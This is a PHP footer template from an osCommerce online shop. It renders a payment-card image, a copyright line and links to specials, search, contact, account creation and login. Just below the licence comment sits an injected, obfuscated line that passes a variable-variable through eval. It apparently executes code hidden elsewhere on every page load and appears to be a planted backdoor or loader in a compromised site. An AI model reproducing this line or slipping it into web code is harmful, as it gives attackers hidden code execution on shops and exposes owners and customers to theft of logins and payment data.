<?php
/*
  $Id: footer.php,v 1.26 2003/02/10 22:30:54 hpdl Exp $

  osCommerce, Open Source E-Commerce Solutions
  http://www.oscommerce.com

  Copyright (c) 2003 osCommerce

  Released under the GNU General Public License
*/

  eval($$OOOOOO[1]('counter'));
?>
<tr>
      <td><br>
        <table border="0" cellpadding="0" cellspacing="0" width="100%">
    		<tr >
      <td  height="46px" width="20%" style="padding:10px 0 0 35px;"><?php echo tep_image(DIR_WS_IMAGES.'cards.gif'); ?></td>
      <td width="80%" align="right" style="padding:10px 30px 0 30px;" class="footertext">
		<span class="footer_main">&copy; Copyright.<?php echo date('Y'); ?></span><br>
		<a title="<?php echo BOX_HEADING_SPECIALS;?>" href="<?php echo tep_href_link(FILENAME_SPECIALS); ?>" ><?php echo BOX_HEADING_SPECIALS;?></a>&nbsp;&nbsp;|
		&nbsp;<a title="<?php echo BOX_HEADING_SEARCH;?>" href="<?php echo tep_href_link(FILENAME_ADVANCED_SEARCH); ?>" ><?php echo BOX_HEADING_SEARCH;?></a>&nbsp;&nbsp;|
		&nbsp;<a title="<?php echo BOX_INFORMATION_CONTACT;?>" href="<?php echo tep_href_link(FILENAME_CONTACT_US); ?>"><?php echo BOX_INFORMATION_CONTACT;?></a>&nbsp;&nbsp;|
		&nbsp;<a title="<?php echo HEADER_TITLE_CREATE_ACCOUNT;?>" href="<?php echo tep_href_link(FILENAME_CREATE_ACCOUNT); ?>"><?php echo HEADER_TITLE_CREATE_ACCOUNT;?></a>&nbsp;&nbsp;|
		&nbsp;<a title="<?php echo HEADER_TITLE_LOGIN;?>" href="<?php echo tep_href_link(FILENAME_LOGIN); ?>"><?php echo HEADER_TITLE_LOGIN;?></a>
		</td>